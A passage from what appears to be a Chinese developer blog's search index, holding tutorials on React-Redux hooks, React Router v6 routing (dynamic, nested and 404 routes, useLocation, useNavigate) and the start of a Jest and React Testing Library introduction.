Provider，讓底下所有元件能夠接收 在元件內使用 useSelector 取出需要的 state（搭配前面寫好的 selectors.js） 先引入 useDispatch，接著就能透過 dispatch 發出 action 這邊直接附上 code，你邊看邊想一下應該就懂了： 12345678910// index.jsimport { Provider } from \"react-redux\";import store from \"./redux/store\"const root = ReactDOM.createRoot(document.getElementById(\"root\"));root.render( &lt;Provider store={store}&gt; &lt;App /&gt; &lt;/Provider&gt;); 123456789101112131415161718192021222324252627282930313233// App.jsimport { useState, useEffect } from \"react\";import { useSelector, useDispatch } from \"react-redux\";import { selectTodos } from \"./redux/selectors\"import { addTodo } from \"./redux/actions\"function App() { const [value, setValue] = useState(\"\"); // 用 useSelector 把 todos 的 state 拿出來 const todos = useSelector(selectTodos); // 定義用來發出 dispatch 的 function const dispatch = useDispatch(); // 表單 submit 後 disptch 新增 todo 的 action const handleSubmit = e =&gt; { e.preventDefault(); dispatch(addTodo(value)); setValue(\"\") } return ( &lt;div className=\"App\"&gt; &lt;form onSubmit={handleSubmit}&gt; &lt;input value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;/form&gt; &lt;ul&gt; {todos.map(todo =&gt; &lt;li key={todo.id} data-id={todo.id} &gt;{todo.name}&lt;/li&gt;)} &lt;/ul&gt; &lt;/div&gt; );}export default App; 這樣子其實就串好囉！有疑問的話也可以去我寫的 範例 參考。","link":"/2022/04/24/react-redux-by-hooks/"},{"title":"React 基本的路由結構","text":"繼 Vue 以後的第二個前端路由。 簡述先來看一下結構長怎樣： 1234567891011121314151617181920// Router 有分成 HashRouter / BrowserRouter// 這個留到下面再做說明import { HashRouter as Router, Routes, Route, Link } from \"react-router-dom\";&lt;Router&gt; &lt;Link to=\"/\"&gt;home&lt;/Link&gt; &lt;Link to=\"/about\"&gt;about&lt;/Link&gt; &lt;Link to=\"/categories\"&gt;categories&lt;/Link&gt; &lt;Link to=\"/posts\"&gt;posts&lt;/Link&gt; &lt;Link to=\"/log-in\"&gt;log in&lt;/Link&gt; &lt;Link to=\"//sign-up\"&gt;/sign up&lt;/Link&gt; &lt;Routes&gt; &lt;Route path=\"/\" element={&lt;HomePage /&gt;} /&gt; &lt;Route path=\"/about\" element={&lt;AboutPage /&gt;} /&gt; &lt;Route path=\"/categories\" element={&lt;CategoriesPage /&gt;} /&gt; &lt;Route path=\"/posts\" element={&lt;PostsPage /&gt;} /&gt; &lt;Route path=\"/posts/:id\" element={&lt;SinglePostPage /&gt;} /&gt; &lt;Route path=\"/log-in\" element={&lt;LoginPage /&gt;} /&gt; &lt;Route path=\"/sign-up\" element={&lt;SignUpPage /&gt;} /&gt; &lt;/Routes&gt;&lt;/Router&gt; &lt;Router&gt; 這邊是用來管理路由的元件，請務必把所有內容都放在這裡面。 &lt;Link&gt; 其實就是 &lt;a&gt;，用來設定點下時該跳轉到哪個頁面 &lt;Routes&gt; 用來匹配路由的元件，在 V6 之前叫做 &lt;Switch&gt; &lt;Route path=\"...\" element=\"...\"&gt; 用來設定不同路由要顯示哪個 Component。 基本結構大致就是這樣！接下來會講一些補充內容。 Router 的種類，HashRouter 與 BrowserRouterRouter 其實有兩種選擇： 1234// 有 hashimport { HashRouter as Router } from \"react-router-dom\"// 沒有 hash（用 History API 實現）import { BrowserRouter as Router } from \"react-router-dom\" 這兩個差在如果是 hash mode 的話，對 server 而言你都是在請求同一個檔案，因此不會 404。 123不管是哪一個，你永遠都是在對 example.com 發出 requesthttps://example.com/#/homehttps://example.com/#/about 但如果是 History API，server 就會認為你是在找不同的檔案，所以找不到對應資源時就會回傳 404。 123瀏覽器分辨不出來，所以會直接發出 requesthttps://example.com/homehttps://example.com/about 總而言之，如果希望網址不要出現 #，就得到 server 設定一些東西，讓每個路由都一律導向 index.html，這樣就不會出現 404 的問題了。但如果你很懶得調的話就用 hash mode 吧！ 動態路由有些時候路由是動態產生的，像 /posts/1 posts/2 這種後面的數字不是固定的，就會用到。 設定方式也很簡單，就跟 Express 的寫法差不多： 1234567&lt;Router&gt; &lt;NavBar /&gt; &lt;Routes&gt; {/* 希望接收的參數 */} &lt;Route path=\"/posts/:id\" element={&lt;SinglePostPage /&gt;} /&gt; &lt;/Routes&gt;&lt;/Router&gt; 接著在 &lt;SinglePostPage /&gt; 就可以透過 useParams 來取得參數值： 12345export default function SinglePostPage() { // 解構拿出來 const { id } = useParams(); console.log('id:', id);}","link":"/2022/04/12/react-router-basic/"},{"title":"React router dom 相關的 hook","text":"一步一步累積。 簡述雖然目前接觸的還不多，但如果之後有機會的話會慢慢把一些我覺得不錯用的 hook 給補上來。 useLocation簡單來說就是會提供你跟「網址」相關的資訊，內容會長這樣： 1234567{ \"pathname\": \"/search\", \"search\": \"\", \"hash\": \"\", \"state\": null, \"key\": \"oaeqgk1p\"} 運用這個東西可以來實現導覽列 active 的狀態，假設我有一個 &lt;Nav /&gt; 內容如下： 12345678910111213141516171819202122232425262728import React, { useEffect } from \"react\";import { Link } from \"react-router-dom\";const Nav: React.FC = () =&gt; { useEffect(() =&gt; { console.log(\"path\", location.pathname); }, [location.pathname]); return ( &lt;ul&gt; &lt;li&gt; &lt;Link to=\"\"&gt;Home&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"about\"&gt;About&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"products\"&gt;Products&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"search\"&gt;Search&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; );};export default Nav; 我希望當我在 \"\" 的頁面時，&lt;Link /&gt; 時加上 active 的 className，其他的也是以此類推，那我就可以利用 location 來做這件事： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import React, { useEffect } from \"react\";import { Link, useLocation } from \"react-router-dom\";const Nav: React.FC = () =&gt; { const location = useLocation(); useEffect(() =&gt; { console.log(\"path\", location.pathname); }, [location.pathname]); return ( &lt;ul&gt; &lt;li&gt; &lt;Link to=\"\" className={location.pathname === \"/\" ? \"active\" : \"\"}&gt; Home &lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"about\" className={location.pathname === \"/about\" ? \"active\" : \"\"} &gt; About &lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"products\" className={location.pathname === \"/products\" ? \"active\" : \"\"} &gt; Products &lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"search\" className={location.pathname === \"/search\" ? \"active\" : \"\"} &gt; Search &lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; );};export default Nav; 這樣子就能實現囉！ 雖然這應該不是最好的做法，畢竟有點 hard code。但主要是想介紹 useLocation 這個 hook 而已。 最後一樣附上範例。 useNavigate 之 replace 的作用useNavigate 最常見的用途是拿來跳轉頁面，這個大家應該都知道，所以這邊就不介紹了。這邊要介紹的是 replace 這個可選參數的用途。 假設我有一個網站，登入後才能進到首頁，那我可能就會在提交表單的時候用 useNavigate 來處理，像這樣： 1234567891011121314151617181920212223242526272829import React from \"react\";import { useNavigate } from \"react-router-dom\";const Login: React.FC = () =&gt; { const navigate = useNavigate(); const handleSubmit = (e: React.FormEvent&lt;HTMLFormElement&gt;) =&gt; { e.preventDefault(); // 送出表單後導向首頁 navigate(\"/home\"); }; return ( &lt;div&gt; &lt;h2&gt;Login&lt;/h2&gt; &lt;form onSubmit={handleSubmit}&gt; &lt;div&gt; username: &lt;input type=\"text\" /&gt; &lt;/div&gt; &lt;div&gt; password: &lt;input type=\"password\" /&gt; &lt;/div&gt; &lt;button&gt;submit&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; );};export default Login; 可是這樣會有一個問題，就是我可以按「上一頁」來回到登入畫面： （後來要補圖時卻做不出這效果…，總之確實是能回到上一頁的） 很詭異吧？所以 replace 就是這樣用的，只要改寫成這樣： 1234567891011121314151617181920212223242526272829import React from \"react\";import { useNavigate } from \"react-router-dom\";const Login: React.FC = () =&gt; { const navigate = useNavigate(); const handleSubmit = (e: React.FormEvent&lt;HTMLFormElement&gt;) =&gt; { e.preventDefault(); // 加上 replace: true navigate(\"/home\", { replace: true }); }; return ( &lt;div&gt; &lt;h2&gt;Login&lt;/h2&gt; &lt;form onSubmit={handleSubmit}&gt; &lt;div&gt; username: &lt;input type=\"text\" /&gt; &lt;/div&gt; &lt;div&gt; password: &lt;input type=\"password\" /&gt; &lt;/div&gt; &lt;button&gt;submit&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; );};export default Login; 這樣就沒辦法回到上一頁啦！ 順道一提，如果你是用 &lt;Link /&gt; 來跳轉的話，它也有 replace 這個屬性可以用，功能是一模一樣的： 12345678910111213141516import React from \"react\";import { Link } from \"react-router-dom\";const Home: React.FC = () =&gt; { return ( &lt;div&gt; &lt;h2&gt;Welcome come back!&lt;/h2&gt; &lt;p&gt;Let's see some thing new.&lt;/p&gt; &lt;Link to=\"../\" replace={true}&gt; back &lt;/Link&gt; &lt;/div&gt; );};export default Home; 最後，想看範例的話可以到這邊來看。","link":"/2022/05/14/react-router-dom-hook/"},{"title":"重溫 React router dom","text":"感覺這篇文特別長。 簡述雖然以前有學過 React router dom，也有實際用過的經驗，但感覺自己對有些東西還是不夠熟，所以今天就來重溫這個主題。 Router、Routes、Route，你們到底差在哪？先讓我們看一段 code 再來解釋： 1234567891011121314151617181920import React from 'react';import Home from \"./Home\";import About \"./About\";import Profile from \"./Profile\";import { HashRouter as Router, Routes, Route } from \"react-router-dom\"export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;a href='/home'&gt;Show in every page&lt;/a&gt; &lt;Routes&gt; &lt;Route path=\"/\" element={&lt;Home /&gt;}&gt;&lt;/Route&gt; &lt;Route path=\"/about\" element={&lt;About /&gt;}&gt;&lt;/Route&gt; &lt;Route path=\"/profile\" element={&lt;Profile /&gt;}&gt;&lt;/Route&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App; 首先 Router 其實是 BrowserRouter 的 HashRouter 的別名，因為原名太長了才會改用這個名字來代表。 至於 BrowserRouter 的 HashRouter 的最主要的差異在於網址會不會有 # ，知道這樣就夠了。 至於 Routers 跟 Route 的差別顯而易見，Routers 是用來把所有路由給包住的（注意字尾的 s），而 Route 則是用來顯示哪個網址要顯示哪個 Component。 另外這個例子裡還特意放了一個 &lt;a&gt; 在 Routes 外面，其實是想順便說一件事情，就是像導覽列這種每一個頁面都會用到的 Component，我們就不會把它放在 Routes 裡。 基本結構與 404 頁面12345678910111213141516171819import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import About from './pages/About'import Home from './pages/Home'import Profile from './pages/Profile'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Routes&gt; &lt;Route path='/' element={&lt;Home /&gt;} /&gt; &lt;Route path='/about' element={&lt;About /&gt;} /&gt; &lt;Route path='/profile' element={&lt;Profile /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App 就跟一開始的範例一樣，我們會在 Route 透過 path 和 element 來指定「哪個路由顯示哪個 Component」。 但如果我們想要有個 404 頁面怎麼辦？可以這樣做： 123456789101112131415161718192021import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import About from './pages/About'import ErrorPage from './pages/ErrorPage'import Home from './pages/Home'import Profile from './pages/Profile'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Routes&gt; &lt;Route path='/' element={&lt;Home /&gt;} /&gt; &lt;Route path='/about' element={&lt;About /&gt;} /&gt; &lt;Route path='/profile' element={&lt;Profile /&gt;} /&gt; &lt;Route path='*' element={&lt;ErrorPage /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App 這邊的技巧是把 path 指定為 * 並且放在最下面（一定要這樣子）。 為什麼要這樣做？因為只有當上面都匹配不到時才會套用最後一個，所以我們只要把它對應到 404 的 Component 就好囉。 切換路由切換路由主要有兩種方式，一種是透過 Link（react-router-dom 提供的元件），另一種是透過 useNavigate。 這邊先來看 Link 的做法，首先要先建立一個 Nav 元件來當作導覽列： 1234567891011121314151617181920import React from 'react'import { Link } from 'react-router-dom'const Nav: React.FC = () =&gt; { return ( &lt;ul&gt; &lt;li&gt; &lt;Link to='/'&gt;Home&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to='/about'&gt;About&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to='/profile'&gt;Profile&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; )}export default Nav &lt;Link&gt; 的本體就是 &lt;a&gt; 而已，所以你也可以用 &lt;a&gt; 來取代。但通常會建議用 &lt;Link&gt;，因為如果用的是 HashRouter 就不能像上面一樣只寫 /about，而是得自己加上 #。 接著再把 Nav 放到主頁面中就行囉： 12345678910111213141516171819202122import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import About from './pages/About'import ErrorPage from './pages/ErrorPage'import Home from './pages/Home'import Profile from './pages/Profile'import Nav from './pages/Nav'// 因為所有頁面都會出現，所以會放在 Routes 外面export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Nav /&gt; &lt;Routes&gt; &lt;Route path='/' element={&lt;Home /&gt;} /&gt; &lt;Route path='/about' element={&lt;About /&gt;} /&gt; &lt;Route path='/profile' element={&lt;Profile /&gt;} /&gt; &lt;Route path='*' element={&lt;ErrorPage /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )} 接著是第二種做法，用 useNavigate。這個可能會用在填完表單時要跳轉時的情境，換句話說就是透過 JS 來做切換： 12345678910111213141516import React from 'react'import { useNavigate } from 'react-router-dom'const About: React.FC = () =&gt; { // 記得是拿 call 完後的東西來用，不是直接 useNavigate(\"/\") const navigate = useNavigate() return ( &lt;div&gt; About page &lt;button onClick={() =&gt; navigate('/')}&gt;Go back to home page&lt;/button&gt; &lt;/div&gt; )}export default About 動態路由舉一個常見的例子，如果你想造訪某個人的 profile，那網址一定是長成這樣： https://aaa.com/profile/peanu https://aaa.com/profile/ppb https://aaa.com/profile/huli 結構都是以 /profile/名稱 來組成，可是因為名稱不是固定的值，所以才會說這是「動態」的。 實現的方式也不難，直接來看 code。 首先先調整一下路由的部分： 123456789101112131415161718192021222324import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import About from './pages/About'import ErrorPage from './pages/ErrorPage'import Home from './pages/Home'import Profile from './pages/Profile'import Nav from './pages/Nav'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Nav /&gt; &lt;Routes&gt; &lt;Route path='/' element={&lt;Home /&gt;} /&gt; &lt;Route path='/about' element={&lt;About /&gt;} /&gt; {/* 後面接 /:params */} &lt;Route path='/profile/:username' element={&lt;Profile /&gt;} /&gt; &lt;Route path='*' element={&lt;ErrorPage /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App 只要加上 : 就代表這是動態的值，並且會用一個變數的方式來代表這個值。 接著到 &lt;Profile /&gt; 的部分做點調整，這邊會用到 useParams 這個 hook。 它的用途就是讓我們取得動態路由的內容，簡單來說，如果網址是 /profile/peanu，回傳值就會是 { username: \"peanu\" }，以此類推。 12345678910import React from 'react'import { useParams } from 'react-router-dom'const Profile: React.FC = () =&gt; { const { username } = useParams() return &lt;div&gt;Hi, This is {username}'s Profile page&lt;/div&gt;}export default Profile 調整完以後，現在到 /profile/paenu 時結果就會是 Hi, This is peanu's Profile page，其他也是以此類推。 加入動態路由的功能後，就可以根據路由的值來決定要呈現什麼內容，是非常實用的功能。 好，到這邊先中場休息。等一下會介紹我覺得比較複雜的東西：巢狀路由 另外有需要原始碼的話可以參考這裡。 巢狀路由這邊會用底下的範例來解說： 12345678910111213141516171819202122import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import User from './pages/User'import Nav from './pages/Nav'import Home from './pages/Home'import NoMatch from './pages/Nomatch'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Nav /&gt; &lt;Routes&gt; &lt;Route index element={&lt;Home /&gt;} /&gt; &lt;Route path='home' element={&lt;Home /&gt;} /&gt; &lt;Route path='user' element={&lt;User /&gt;} /&gt; &lt;Route path='*' element={&lt;NoMatch /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App 我們希望 /user 底下有 /user/profile 跟 /user/account 這兩個頁面，像這樣： 首先先到 &lt;User /&gt; 中建立用來跳轉的連結： 1234567891011121314151617181920import React from 'react'import { Link } from 'react-router-dom'const User: React.FC = () =&gt; { return ( &lt;div className='container'&gt; &lt;h2&gt;User: PeaNu&lt;/h2&gt; &lt;ul&gt; &lt;li&gt; &lt;Link to='profile'&gt;Profile&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to='account'&gt;Account&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; )}export default User 路徑的部分可以寫成相對路徑或絕對路徑： /user/profile（絕對） profile（相對） 但請別寫成 /profile，因為用 / 來開頭就會被當成絕對路徑，所以會跳到 https://aaa.com/profile 這個位置。 做到這邊以後，點了連接應該會跳到 404 頁面，這是因為我們還沒有去設定路由，讓 React 知道 /user/profile 要顯示哪個 Component，所以接著來對這部分做設定： 12345678910111213141516171819202122232425262728import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import User from './pages/User'import Nav from './pages/Nav'import Home from './pages/Home'import NoMatch from './pages/Nomatch'import Profile from './pages/Profile'import Account from './pages/Account'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Nav /&gt; &lt;Routes&gt; &lt;Route index element={&lt;Home /&gt;} /&gt; &lt;Route path='home' element={&lt;Home /&gt;} /&gt; &lt;Route path='user' element={&lt;User /&gt;}&gt; {/* 因為是巢狀，所以得包在 user 的 Route 裡面 */} &lt;Route path='profile' element={&lt;Profile /&gt;}&gt;&lt;/Route&gt; &lt;Route path='account' element={&lt;Account /&gt;}&gt;&lt;/Route&gt; &lt;/Route&gt; &lt;Route path='*' element={&lt;NoMatch /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App 附註：關於 &lt;Profile /&gt; 和 &lt;Account /&gt; 這兩個元件就麻煩你自己去建立一下，這邊就不貼出來佔版面了。 做到這以後看起來好像就差不多了？但其實還沒有，目前點連結後會發現網址確實會變成 /user/profile，可是並不會顯示 &lt;Profile /&gt; 的內容。 這是因為我們漏掉了 Outlet 這個東西。 12345678910111213141516171819202122import React from 'react'import { Link, Outlet } from 'react-router-dom'const User: React.FC = () =&gt; { return ( &lt;div className='container'&gt; &lt;h2&gt;User: PeaNu&lt;/h2&gt; &lt;ul&gt; &lt;li&gt; &lt;Link to='profile'&gt;Profile&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to='account'&gt;Account&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; {/* 加上 Outlet */} &lt;Outlet /&gt; &lt;/div&gt; )}export default User Outlet 是負責把匹配的子路由給顯示出來的 Component，這邊因為 Outlet 是放在 User 中，所以會根據剛剛寫的路由來匹配 profile 和 account 這兩個路徑。 順道一提，如果你想避免 /user/profile/xxxx 的時候跳轉到 404，你可以透過 * 來處理： 12345678910111213&lt;router&gt; &lt;nav /&gt; &lt;routes&gt; &lt;route index element={&lt;Home /&gt;} /&gt; &lt;route path='home' element={&lt;Home /&gt;} /&gt; &lt;route path='user' element={&lt;User /&gt;}&gt; {/* 加上 * 號 */} &lt;route path='profile/*' element={&lt;Profile /&gt;}&gt;&lt;/route&gt; &lt;route path='account/*' element={&lt;Account /&gt;}&gt;&lt;/route&gt; &lt;/route&gt; &lt;route path='*' element={&lt;Nomatch /&gt;} /&gt; &lt;/routes&gt;&lt;router&gt; OK，以上就是巢狀路由的教學，如果想參考原始碼的話可以到這邊來看。 另一種巢狀結構的思維剛剛介紹的巢狀結構，實際在使用時看起來是像這樣： 可是如果我希望點下 profile 時，是跳轉到一個全新的頁面，而不是像上面那樣保留導覽列的情境呢？像這樣： 這時候就要用比較 tricky 的作法了（也有人說是寫 App 的思維）。 首先要先回憶一下 Outlet 這個 Component 的用途，它的用途是把「對應的子路由顯示出來」，而剛剛我們是把它寫在 &lt;User /&gt; 裡面： 12345678910111213141516171819202122import React from 'react'import { Link, Outlet } from 'react-router-dom'const User: React.FC = () =&gt; { return ( &lt;div className='container'&gt; &lt;h2&gt;User: PeaNu&lt;/h2&gt; &lt;ul&gt; &lt;li&gt; &lt;Link to='profile'&gt;Profile&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to='account'&gt;Account&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; {/* 寫在這裡 */} &lt;Outlet /&gt; &lt;/div&gt; )}export default User 所以當我們在造訪 /user/profile 的時候就會把對應的 Component 顯示到 &lt;Outlet /&gt; 裡面。也就是說不管我們怎麼切換路由，導覽列的內容會永遠擺在 &lt;Outlte /&gt; 上面。 既然如此，我們就不能把 &lt;Outlet /&gt; 放在 &lt;User /&gt; 中，可是這樣的話要放在哪裡？ 其實答案可能沒有你想像中的複雜，先來看 code 吧： 123456789101112131415161718192021222324252627282930import React from 'react'import { HashRouter as Router, Routes, Route, Outlet } from 'react-router-dom'import User from './pages/User'import Nav from './pages/Nav'import Home from './pages/Home'import NoMatch from './pages/Nomatch'import Profile from './pages/Profile'import Account from './pages/Account'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Nav /&gt; &lt;Routes&gt; &lt;Route index element={&lt;Home /&gt;} /&gt; &lt;Route path='home' element={&lt;Home /&gt;} /&gt; {/* 放在這裡 */} &lt;Route path='user' element={&lt;Outlet /&gt;}&gt; {/* 這個的意思就是 /user 時顯示 &lt;User /&gt; */} &lt;Route path='' element={&lt;User /&gt;} /&gt; &lt;Route path='profile/*' element={&lt;Profile /&gt;}&gt;&lt;/Route&gt; &lt;Route path='account/*' element={&lt;Account /&gt;}&gt;&lt;/Route&gt; &lt;/Route&gt; &lt;Route path='*' element={&lt;NoMatch /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App 我們把 &lt;Outlet/&gt; 直接放到 /user 的 &lt;Route&gt; 上，意思就會是「請顯示 /user 的子路由」。接著我們又新增了一個 path=\"\" 的子路由，這是什麼意思？ 意思是當我在 /user 這個頁面時，會匹配到 /user\"\" 這個子路由，然後顯示 &lt;User /&gt;。（有點饒口，你可能要多看幾次會比較好理解） 所以經過這樣設計後，就可以實現在 /user/profile 的時候不會出現導覽列，只會有 &lt;Profile /&gt; 的內容。 總之這邊只是想介紹一下這種做法，我對這種巢狀路由的操作還蠻陌生的，所以才特別記錄下來。 這邊也附上原始碼，有需要都可以去看看。 巢狀結構的優化假設我有一個管理系統的網頁，路由結構如下： /system /system/groupA /system/groupA /ststem/groupA/add /system/groupA/:groupCode 然後 group 可能有很多個，例如 A、B、C 等等，那我可能就會這樣設計： 1234567891011121314151617181920212223242526272829&lt;Router&gt; &lt;Routes&gt; {/* /system */} &lt;Route path='system' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;SystemWelcom /&gt;} /&gt; {/* /system/groupA */} &lt;Route path='groupA' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;GroupAList /&gt;} /&gt; &lt;Route path=':groupCode/*' element={&lt;GroupALDetail /&gt;} /&gt; &lt;Route path='add/*' element={&lt;GroupAAdd /&gt;} /&gt; &lt;Route path='*' element={&lt;GroupAList /&gt;} /&gt; &lt;/Route&gt; {/* /system/groupB */} &lt;Route path='groupB' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;GroupBList /&gt;} /&gt; &lt;Route path=':groupCode/*' element={&lt;GroupBLDetail /&gt;} /&gt; &lt;Route path='add/*' element={&lt;GroupBAdd /&gt;} /&gt; &lt;Route path='*' element={&lt;GroupBList /&gt;} /&gt; &lt;/Route&gt; {/* /system/groupC */} &lt;Route path='groupC' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;GroupCList /&gt;} /&gt; &lt;Route path=':groupCode/*' element={&lt;GroupCLDetail /&gt;} /&gt; &lt;Route path='add/*' element={&lt;GroupCAdd /&gt;} /&gt; &lt;Route path='*' element={&lt;GroupCList /&gt;} /&gt; &lt;/Route&gt; &lt;/Route&gt; &lt;/Routes&gt;&lt;/Router&gt; 附註：如果這樣看有點抽象的話，我有寫一個簡單的範例，可以到這邊參考。 雖然這樣子寫沒什麼問題，但其實利用下面這種技巧可以寫更簡潔： 12345678910&lt;Router&gt; &lt;Routes&gt; &lt;Route path='system' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;SystemWelcom /&gt;} /&gt; &lt;Route path='groupA/*' element={&lt;GroupA /&gt;} /&gt; &lt;Route path='groupB/*' element={&lt;GroupB /&gt;} /&gt; &lt;Route path='groupC/*' element={&lt;GroupC /&gt;} /&gt; &lt;/Route&gt; &lt;/Routes&gt;&lt;/Router&gt; 這邊的技巧在於： groupA/* 後面的 /* groupA/* 後面的 /* groupA/* 後面的 /* 因為我研究了蠻久才發現，所以多說幾次（X 你可能會想說用 /groupA 不行嗎？為什麼要 /groupA/*？ 絕對不行 這是因為 /groupA 的意思是「路徑必須是一字不差的 /groupA 才算匹配」，所以當網址 /groupA/add 或 /groupA/list 時，都會被當作不匹配，也就不會顯示 &lt;GroupA /&gt; 這個元件。 但 /groupA/* 就不一樣了，/* 的意思是後面接什麼都可以，所以你要 /groupA/123 還是 /groupA/321 都無所謂，全部都會匹配成功，這個就是我們要的效果。 最後，你可能會好奇 &lt;groupA /&gt; 是什麼東西？這邊就順便說一下。 這邊是利用這樣的資料夾結構： GroupA List.tsx Detail.tsx Add.tsx index.tsx 看到 index 的第一眼應該就能猜到一件事，就是只要看這支檔案就能知道這在幹嘛了，所以我們來看一下： 1234567891011121314151617import React from 'react'import { Routes, Route } from 'react-router-dom'import List from './List'import Detail from './Detail'import Add from './Add'const GroupA: React.FC = () =&gt; { return ( &lt;Routes&gt; &lt;Route path='' element={&lt;List /&gt;} /&gt; &lt;Route path='add' element={&lt;Add /&gt;} /&gt; &lt;Route path=':groupCode' element={&lt;Detail /&gt;} /&gt; &lt;/Routes&gt; )}export default GroupA 就是把對應的子路由和元件引入後在輸出而已，沒有你想的那麼複雜。 好啦，其實是我覺得要解釋很詳細的話會花很多時間，所以如果真的想研究的話，建議到這邊看原始碼比較快。 一個當初踩到的雷如果一個 Component 有用到 &lt;Link /&gt; 或是 useNavigate 之類的東西的話，那它一定要放在 &lt;Router /&gt; 裡面，不然就會噴這個錯誤： 當初被這個雷卡很久，想說我根本沒用到 useHref 這個 hook 阿，真是的 QQ。 詳細可以參考這裡：https://stackoverflow.com/questions/70220413/error-usehref-may-be-used-only-in-the-context-of-a-router-component-it-wor 參考資料 React Router 6: Nested Routes React Router V6 Tutorial - Routes, Redirecting, UseNavigate, UseParams…","link":"/2022/05/13/react-router-dom-review/"},{"title":"React－Testing","text":"以前總認為寫測試很麻煩，最近才慢慢體會到測試是一項很重要的技能。 關於 Jest 與 React Testing LibraryJest一個用來執行測試的 Runner，它能夠自動找出該被測試的檔案並執行測試，並把測試結果轉換成好閱讀的結果。 React Testing Library (RTL)讓 JavaScript 可以透過 Virtual DOM 的方式來測試 React Component。 Testing Library 其實是一套集結各種 UI 元件的測試庫，所以 React 只是這個家族中的其中一個項目。 背後運作的核心是「DOM Testing Library」，而 RTL 只是把這些東西包裝起來讓我們使用起來更方便一點。 各種測試套件 @testing-library/jest-dom @testing-library/react @testing-library/user-event 如果是用 CRA 來建立專案的人，CRA 會在建立時自動安裝好這些套件和設定，不需要額外處理就能開始寫測試囉。 setupTests.ts如果是用 CRA 建立環境的話應該能在根目錄看到這個檔案，內容是這樣： 12345// jest-dom adds custom jest matchers for asserting on DOM nodes.// allows you to do things like:// expect(element).toHaveTextContent(/react/i)// learn more: https://github.com/testing-library/jest-domimport '@testing-library/jest-dom' 以 CRA 的例子來說是用來把 jest-dom 提供的 matcher 給引入到 jest，讓我們寫測試的能夠時使用那些額外的 matcher。 原理的話很簡單，就是在 jest 執行以前會先執行 setupTests.ts 的內容，所以 jest 自然可以看懂那些額外的 matcher。 Jest watch modeCRA 預設開啟 watch mode，watch mode 的用途是執行 test 時只會對上次 commit 後有被修改的檔案做測試，避免花很多時間跑不相關的測試。 Filename Convention以 Jest 來說的話會分成底下幾個： .test.js（檔案） .spec.js（檔案） __tess__（資料夾） 比較常見的做法是把測試檔案放在原檔案的隔壁，這樣就可以用最短的 import 路徑來引入，要找測試檔案的時候也比較好找。 基本結構一個 Test 會包含三個要素： Arrange（佈置，簡單來說就是把 component 渲染出來） Action（動作） Assertion / Expect（斷言） 範例： 123456789test('if user inputted amount and note fields, the buttons become enabled. ', async () =&gt; { // 渲染 TransactionCreateStepTwo 這個 component render(&lt;TransactionCreateStepTwo sender={{ id: '5' }} receiver={{ id: '6' }} /&gt;) // 使用者輸入在表單中輸入內容 userEvent.type(screen.getByPlaceholderText(/amount/i), '50') userEvent.type(screen.getByPlaceholderText(/add a note/i), 'This is good for you.') // 最後應該產生什麼結果（變成 Enabled） expect(await screen.findByRole('button', { name: /pay/i })).toBeEnabled()}) 這段測試是當使用者輸入必填欄位後，提交按鈕應該要被 enabled。 Jest matcher當我們用 expect(...) 建立一個 Assertion 時，都會搭配一個「matcher」來決定我們 Assertion 是否正確，舉例來說： 1expect(element).toHaveTextContent('abc') 這是用來檢查 element 中是否有包含 abc 的內容。後面的 toHaveTextContent 就是 matcher。 這裡列出幾個比較常用到的 matcher： toHaveTextContent 元素的文字內容 toBeInTheDocument 元素有出現在 DOM not.toBeInTheDocument 文字沒有出現在 DOM 這邊講的 matcher 多數是來自 jest-dom，如果你想查 jest 自己的 matcher 可以參考 Jest 的官方文件。 Jest API describe() 把一群 test 給 group 